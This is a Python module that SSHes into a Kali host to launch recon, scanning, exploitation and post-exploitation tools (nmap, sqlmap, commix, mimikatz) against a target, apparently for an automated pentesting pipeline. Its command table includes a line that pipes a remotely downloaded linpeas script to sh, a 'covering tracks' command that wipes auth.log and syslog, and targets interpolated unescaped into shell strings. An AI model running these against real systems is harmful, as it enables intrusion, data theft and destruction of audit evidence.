"""Robust SSH-based tool execution manager with PTY support
Handles: sudo, interactive commands, real-time streaming, error recovery
"""
import paramiko
import select
import threading
import time
import re
from datetime import datetime
from typing import Dict, Any, Optional, Callable
from config import Config

class ToolManager:
    def __init__(self, socketio):
        self.socketio = socketio
        self.ssh_client = None
        self.current_execution = None
        self.output_buffer = []
        
    def connect_ssh(self) -> paramiko.SSHClient:
        """
        Establish SSH connection with proper configuration
        """
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connection parameters
            connect_params = {
                'hostname': Config.KALI_HOST,
                'port': Config.KALI_PORT,
                'username': Config.KALI_USER,
                'timeout': 30,
                'banner_timeout': 30,
                'auth_timeout': 30,
                'look_for_keys': False,
                'allow_agent': False
            }
            
            # Use password or key
            if Config.KALI_KEY_PATH:
                connect_params['key_filename'] = Config.KALI_KEY_PATH
            else:
                connect_params['password'] = Config.KALI_PASSWORD
            
            client.connect(**connect_params)
            
            # Test connection
            stdin, stdout, stderr = client.exec_command('echo "SSH connection test"')
            test_output = stdout.read().decode()
            
            if "SSH connection test" not in test_output:
                raise Exception("SSH connection test failed")
            
            print(f"✅ SSH connected to {Config.KALI_HOST}")
            return client
            
        except Exception as e:
            print(f"❌ SSH connection failed: {e}")
            raise

    def execute_tool(self, tool_name: str, target: str, parameters: Dict[str, Any],
                  scan_id: str, phase: str) -> Dict[str, Any]:
        """
        Execute pentesting tool with real-time output streaming
        
        Args:
            tool_name: Tool to execute (e.g., 'nmap', 'sqlmap')
            target: Target URL/IP
            parameters: Tool-specific parameters
            scan_id: Unique scan identifier
            phase: Current pentesting phase
            
        Returns:
            Dictionary with execution results
        """
        start_time = datetime.now()
        
        try:
            # Connect SSH
            if not self.ssh_client or not self.ssh_client.get_transport().is_active():
                self.ssh_client = self.connect_ssh()
            
            # Build command
            command = self.build_command(tool_name, target, parameters)
            
            # Notify frontend
            self.socketio.emit('tool_execution_start', {
                'scan_id': scan_id,
                'tool': tool_name,
                'phase': phase,
                'command': command,
                'timestamp': start_time.isoformat()
            })
            
            # Execute with streaming
            exit_code, stdout, stderr = self.execute_with_streaming(
                command, 
                scan_id, 
                tool_name
            )
            
            end_time = datetime.now()
            execution_time = (end_time - start_time).total_seconds()
            
            # Parse output
            from inference.output_parser import OutputParser
            parser = OutputParser()
            parsed_results = parser.parse_tool_output(tool_name, stdout, stderr)
            
            result = {
                'tool_name': tool_name,
                'target': target,
                'phase': phase,
                'command': command,
                'exit_code': exit_code,
                'stdout': stdout,
                'stderr': stderr,
                'execution_time': execution_time,
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'success': exit_code == 0,
                'parsed_results': parsed_results
            }
            
            # Notify completion
            self.socketio.emit('tool_execution_complete', {
                'scan_id': scan_id,
                'tool': tool_name,
                'success': result['success'],
                'execution_time': execution_time,
                'findings_count': len(parsed_results.get('vulnerabilities', []))
            })
            
            return result
            
        except Exception as e:
            print(f"❌ Tool execution error: {e}")
            self.socketio.emit('tool_execution_error', {
                'scan_id': scan_id,
                'tool': tool_name,
                'error': str(e)
            })
            raise

    def execute_with_streaming(self, command: str, scan_id: str,
                            tool_name: str) -> tuple:
        """
        Execute command with real-time output streaming using PTY
        
        Returns:
            (exit_code, stdout, stderr)
        """
        # Get transport and open session
        transport = self.ssh_client.get_transport()
        channel = transport.open_session()
        
        # Request PTY (pseudo-terminal) - CRITICAL for interactive commands
        channel.get_pty(term='xterm', width=200, height=50)
        
        # Execute command
        channel.exec_command(command)
        
        stdout_data = []
        stderr_data = []
        
        # Non-blocking I/O
        channel.setblocking(0)
        
        while not channel.exit_status_ready():
            # Check if data available
            if channel.recv_ready():
                chunk = channel.recv(4096).decode('utf-8', errors='ignore')
                stdout_data.append(chunk)
                
                # Stream to frontend
                self.socketio.emit('tool_output', {
                    'scan_id': scan_id,
                    'tool': tool_name,
                    'output': chunk,
                    'timestamp': datetime.now().isoformat()
                })
                
                # Print to console
                print(chunk, end='', flush=True)
            
            if channel.recv_stderr_ready():
                chunk = channel.recv_stderr(4096).decode('utf-8', errors='ignore')
                stderr_data.append(chunk)
                
                # Stream errors
                self.socketio.emit('tool_error_output', {
                    'scan_id': scan_id,
                    'tool': tool_name,
                    'error': chunk
                })
            
            # Small delay to prevent CPU spinning
            time.sleep(0.1)
        
        # Get remaining data
        while channel.recv_ready():
            chunk = channel.recv(4096).decode('utf-8', errors='ignore')
            stdout_data.append(chunk)
            self.socketio.emit('tool_output', {
                'scan_id': scan_id,
                'tool': tool_name,
                'output': chunk
            })
        
        while channel.recv_stderr_ready():
            chunk = channel.recv_stderr(4096).decode('utf-8', errors='ignore')
            stderr_data.append(chunk)
        
        exit_code = channel.recv_exit_status()
        channel.close()
        
        return exit_code, ''.join(stdout_data), ''.join(stderr_data)

    def build_command(self, tool_name: str, target: str,
                  parameters: Dict[str, Any]) -> str:
        """
        Build tool-specific commands with proper escaping
        """
        # Tool command templates
        commands = {
            # RECONNAISSANCE
            'sublist3r': f"sublist3r -d {target} -o /tmp/sublist3r_output.txt",
            'theHarvester': f"theHarvester -d {target} -b all -f /tmp/harvester_output",
            'dnsenum': f"dnsenum {target}",
            'fierce': f"fierce --domain {target}",
            'whatweb': f"whatweb {target} -a 3",
            
            # SCANNING
            'nmap': self._build_nmap_command(target, parameters),
            'masscan': f"masscan {target} -p1-65535 --rate=1000",
            'nuclei': f"nuclei -u {target} -severity critical,high,medium",
            'nikto': f"nikto -h {target} -output /tmp/nikto_output.txt",
            'enum4linux': f"enum4linux -a {target}",
            
            # EXPLOITATION
            'sqlmap': self._build_sqlmap_command(target, parameters),
            'dalfox': f"dalfox url {target}",
            'commix': f"commix --url=\"{target}\" --batch",
            'xsser': f"xsser --url \"{target}\" --auto",
            
            # POST-EXPLOITATION
            'linpeas': "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
            'mimikatz': "python3 /usr/share/mimikatz/mimikatz.py",
            
            # COVERING TRACKS
            'clear_logs': "echo '' > /var/log/auth.log && echo '' > /var/log/syslog",
        }
        
        command = commands.get(tool_name, f"echo 'Tool {tool_name} not configured'")
        
        # Add timeout wrapper
        timeout = parameters.get('timeout', 300)  # 5 minutes default
        command = f"timeout {timeout} {command}"
        
        return command

    def _build_nmap_command(self, target: str, params: Dict) -> str:
        """Build nmap command with parameters"""
        base = f"nmap {target}"
        
        if params.get('aggressive'):
            base += " -A"
        if params.get('version_detection'):
            base += " -sV"
        if params.get('os_detection'):
            base += " -O"
        if params.get('port_range'):
            base += f" -p {params['port_range']}"
        else:
            base += " -p-"  # All ports
        
        base += " -oX /tmp/nmap_output.xml"
        return base

    def _build_sqlmap_command(self, target: str, params: Dict) -> str:
        """Build sqlmap command"""
        base = f"sqlmap -u \"{target}\" --batch --random-agent"
        
        if params.get('dbs'):
            base += " --dbs"
        if params.get('dump'):
            base += " --dump"
        if params.get('level'):
            base += f" --level={params['level']}"
        if params.get('risk'):
            base += f" --risk={params['risk']}"
        
        return base

    def cleanup(self):
        """Close SSH connection"""
        if self.ssh_client:
            self.ssh_client.close()
            print("✅ SSH connection closed")
